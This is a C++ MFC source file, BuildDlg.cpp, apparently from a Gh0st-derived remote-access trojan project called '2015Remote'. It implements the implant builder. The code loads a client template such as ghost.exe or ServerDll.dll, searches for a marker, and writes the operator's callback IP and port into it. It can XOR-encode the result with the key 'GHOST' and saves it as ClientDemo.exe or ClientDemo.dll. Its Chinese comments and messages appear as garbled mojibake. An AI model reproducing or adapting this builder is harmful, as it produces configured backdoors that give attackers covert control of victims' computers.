// BuildDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "2015Remote.h"
#include "BuildDlg.h"
#include "afxdialogex.h"
#include <io.h>

#define OTHER_ITEM 3

// CBuildDlg �Ի���

IMPLEMENT_DYNAMIC(CBuildDlg, CDialog)

int MemoryFind(const char *szBuffer, const char *Key, int iBufferSize, int iKeySize);

CBuildDlg::CBuildDlg(CWnd* pParent)
	: CDialog(CBuildDlg::IDD, pParent)
	, m_strIP(_T(""))
	, m_strPort(_T(""))
{

}

CBuildDlg::~CBuildDlg()
{
}

void CBuildDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_EDIT_IP, m_strIP);
	DDX_Text(pDX, IDC_EDIT_PORT, m_strPort);
	DDX_Control(pDX, IDC_COMBO_EXE, m_ComboExe);
	DDX_Control(pDX, IDC_COMBO_ENCRYPT, m_ComboEncrypt);
	DDX_Control(pDX, IDC_STATIC_OTHER_ITEM, m_OtherItem);
}


BEGIN_MESSAGE_MAP(CBuildDlg, CDialog)
	ON_BN_CLICKED(IDOK, &CBuildDlg::OnBnClickedOk)
	ON_CBN_SELCHANGE(IDC_COMBO_EXE, &CBuildDlg::OnCbnSelchangeComboExe)
END_MESSAGE_MAP()


// CBuildDlg ��Ϣ�������


void CBuildDlg::OnBnClickedOk()
{
	CFile File;
	char szTemp[MAX_PATH];
	ZeroMemory(szTemp,MAX_PATH);
	CString strCurrentPath;
	CString strFile;
	CString strSeverFile;
	BYTE *  szBuffer=NULL;
	DWORD dwFileSize;
	UpdateData(TRUE);
	int index = m_ComboExe.GetCurSel(), typ=index;
	CString file;
	switch (index)
	{
	case CLIENT_TYPE_DLL:
		file = "TestRun.exe";
		break;
	case CLIENT_TYPE_ONE:
		file = "ghost.exe";
		break;
	case CLIENT_TYPE_MODULE:
		file = "ServerDll.dll";
		break;
	case OTHER_ITEM:
		m_OtherItem.GetWindowTextA(file);
		typ = -1;
	default:
		break;
	}
	if (file.IsEmpty() || file == "δѡ���ļ�")
	{
		MessageBox("��Ч�������, ���������ɷ���!");
		return CDialog::OnOK();
	}
	//////////������Ϣ//////////////////////
	CONNECT_ADDRESS g_ConnectAddress = { FLAG_FINDEN, "127.0.0.1", 0, typ};
	g_ConnectAddress.SetServer(m_strIP, atoi(m_strPort));

	if (!g_ConnectAddress.IsValid())
		return;
	try
	{
		//�˴��õ�δ����ǰ���ļ���
		char path[_MAX_PATH], *p = path;
		GetModuleFileNameA(NULL, path, sizeof(path));
		while (*p) ++p;
		while ('\\' != *p) --p;
		strcpy(p+1, file.GetString());

		strFile = typ != -1 ? path : file; //�õ���ǰδ�����ļ���
		if (_access(strFile, 0) == -1)
		{
			MessageBox(CString(strFile) + "\r\n����ģ��\"" + file + "\"������!");
			return CDialog::OnOK();
		}
		
		//���ļ�
		File.Open(strFile,CFile::modeRead|CFile::typeBinary);
		
		dwFileSize=File.GetLength();
		szBuffer=new BYTE[dwFileSize];
		ZeroMemory(szBuffer,dwFileSize);
		//��ȡ�ļ�����
		
		File.Read(szBuffer,dwFileSize);
		File.Close();
		//д������IP�Ͷ˿� ��Ҫ��Ѱ��0x1234567�����ʶȻ��д�����λ��
		int iOffset = MemoryFind((char*)szBuffer,(char*)g_ConnectAddress.Flag(),dwFileSize, g_ConnectAddress.FlagLen());
		if (iOffset==-1)
		{
			MessageBox(CString(path) + "\r\n����ģ��\"" + file + "\"��֧��!");
			return;
		}
		if (MemoryFind((char*)szBuffer + iOffset + sizeof(sizeof(g_ConnectAddress)), (char*)g_ConnectAddress.Flag(),
			dwFileSize - iOffset - sizeof(g_ConnectAddress), g_ConnectAddress.FlagLen()) != -1) {
			MessageBox(CString(path) + "\r\n����ģ��\"" + file + "\"������!");
			return;
		}
		memcpy(szBuffer+iOffset,&g_ConnectAddress,sizeof(g_ConnectAddress));
		//���浽�ļ�
		if (index == CLIENT_TYPE_MODULE)
		{
			strcpy(p + 1, "ClientDemo.dll");
		}
		else {
			strcpy(p + 1, "ClientDemo.exe");
		}
		strSeverFile = typ != -1 ? path : file;
		DeleteFileA(strSeverFile);
		BOOL r=File.Open(strSeverFile,CFile::typeBinary|CFile::modeCreate|CFile::modeWrite);
		if (!r) {
			MessageBox(strSeverFile + "\r\n�������\"" + strSeverFile + "\"����ʧ��!");
			return CDialog::OnOK();
		}
		Encrypt(szBuffer, dwFileSize, m_ComboEncrypt.GetCurSel());
		File.Write(szBuffer, dwFileSize);
		File.Close();
		delete[] szBuffer;
		MessageBox("���ɳɹ�!�ļ�λ��:\r\n"+ strSeverFile);
	}
	catch (CMemoryException* e)
	{
		MessageBox("�ڴ治��!");
	}
	catch (CFileException* e)
	{
		MessageBox("�ļ���������!");
	}
	catch (CException* e)
	{
		MessageBox("δ֪����!");
	}
	CDialog::OnOK();
}

int MemoryFind(const char *szBuffer, const char *Key, int iBufferSize, int iKeySize)   
{   
	int i,j;   
	if (iKeySize == 0||iBufferSize==0)
	{
		return -1;
	}
	for (i = 0; i < iBufferSize; ++i)   
	{   
		for (j = 0; j < iKeySize; j ++)   
			if (szBuffer[i+j] != Key[j])	break;
		if (j == iKeySize) return i;   
	}   
	return -1;   
}


BOOL CBuildDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  �ڴ���Ӷ���ĳ�ʼ��
	m_ComboExe.InsertString(CLIENT_TYPE_DLL, "TestRun.exe");
	m_ComboExe.InsertString(CLIENT_TYPE_ONE, "ghost.exe");
	m_ComboExe.InsertString(CLIENT_TYPE_MODULE, "ServerDll.dll");
	m_ComboExe.InsertString(OTHER_ITEM, CString("ѡ���ļ�"));
	m_ComboExe.SetCurSel(0);

	m_ComboEncrypt.InsertString(0, "��");
	m_ComboEncrypt.InsertString(1, "XOR");
	m_ComboEncrypt.SetCurSel(0);
	m_ComboEncrypt.EnableWindow(FALSE);
	m_OtherItem.ShowWindow(SW_HIDE);

	return TRUE;  // return TRUE unless you set the focus to a control
				  // �쳣: OCX ����ҳӦ���� FALSE
}

Buffer CBuildDlg::Encrypt(BYTE* buffer, int len, int method) {
	switch (method)
	{
	case 0:// ������
		break;
	case 1: // XOR
		xor_encrypt_decrypt(buffer, len, { 'G', 'H', 'O', 'S', 'T' });
		break;
	default:
		break;
	}
	return Buffer();
}


void CBuildDlg::OnCbnSelchangeComboExe()
{
	auto n = m_ComboExe.GetCurSel();
	if (n == OTHER_ITEM)
	{
		CComPtr<IShellFolder> spDesktop;
		HRESULT hr = SHGetDesktopFolder(&spDesktop);
		if (FAILED(hr)) {
			AfxMessageBox("Explorer δ��ȷ��ʼ��! ���Ժ����ԡ�");
			return;
		}
		// ����������ʾ�����ļ����ض������ļ��������ı��ļ���
		CFileDialog fileDlg(TRUE, _T("dll"), NULL, OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT,
			_T("All Files (*.*)|*.*|DLL Files (*.dll)|*.dll|EXE Files (*.exe)|*.exe|"), AfxGetMainWnd());
		int ret = 0;
		try {
			ret = fileDlg.DoModal();
		}
		catch (...) {
			AfxMessageBox("�ļ��Ի���δ�ɹ���! ���Ժ����ԡ�");
			return;
		}
		if (ret == IDOK)
		{
			CString name = fileDlg.GetPathName();

			m_OtherItem.SetWindowTextA(name);
			CFile File;
			BOOL ret = File.Open(name, CFile::modeRead | CFile::typeBinary);
			if (ret) {
				int dwFileSize = File.GetLength();
				LPBYTE szBuffer = new BYTE[dwFileSize];
				File.Read(szBuffer, dwFileSize);
				File.Close();
				m_strIP = "127.0.0.1";
				m_strPort = "6543";
				UpdateData(FALSE);
				SAFE_DELETE_ARRAY(szBuffer);
			}
		}
		else {
			m_OtherItem.SetWindowTextA("δѡ���ļ�");
		}
		m_OtherItem.ShowWindow(SW_SHOW);
	}
	else {
		m_OtherItem.SetWindowTextA("");
		m_OtherItem.ShowWindow(SW_HIDE);
	}
}
